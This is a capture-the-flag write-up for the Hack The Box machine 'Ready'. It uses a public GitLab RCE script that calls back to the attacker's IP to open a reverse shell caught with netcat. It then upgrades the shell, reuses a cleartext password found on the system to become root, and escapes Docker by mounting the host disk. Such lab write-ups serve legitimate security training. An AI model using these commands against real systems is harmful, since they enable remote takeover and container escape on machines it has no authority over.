> Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root's password for hours ðŸ˜…

## TL;DR

Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.

## Footholds

We get an NGINX service running on port `5080`, and we know there is a GitLab on it. Let's check it out!

## Entrypoint

![gitlab.png](gitlab.png)

First thing I did was creating an account to see what's up with this GitLab. Unfortunately, there is no open projects we can mess with:

![projetcs.png](gitlab_projects.png)

A common reflex here is to check the version of the service, let's go to `/help`:

![version.png](gitlab_version.png)

This seems very interesting for us! What do we have for this version?

![vulns.png](gitlab_vulns.png)

Well, we can see there are a lot of exploits in the wild. Let's use the first we find: https://github.com/dotPY-hax/gitlab_RCE

```sh
python gitlab_rce.py http://ready.htb:5080 10.10.14.28
```

We follow the instructions, and create a listener with netcat:

```
nc -vlnp 42069 
Connection from 10.10.10.220:39478
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$
```

And we got a reverse shell!

## User

Very simple user here:

```
git@gitlab:~$ cat /home/dude/user.txt
```

### Upgrade shell

We want a good shell here:

```
git@gitlab:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
ninja@null $ stty raw -echo; fg
git@gitlab:~$
```

We want to get root now.

## Root

The classical privesc enumerators, like `linenum`, `linpeas` or `lse` are telling us we are in a Docker container. We will firstly try to get root in the container in order to escape from it later.

### Get root in container

Running the enumeration scripts, we get some passwords on the system:

![passwords.png](passwords.png)

Of course, there is no way a GitLab SMTP password could be root's as well, right?

### Escape the container

Now that we are root in the container, it is pretty easy to escape:

```
mkdir /tmp/cheh
mount /dev/sda2 /tmp/cheh
ls /tmp/cheh
cat /tmp/cheh/root/root.txt
```
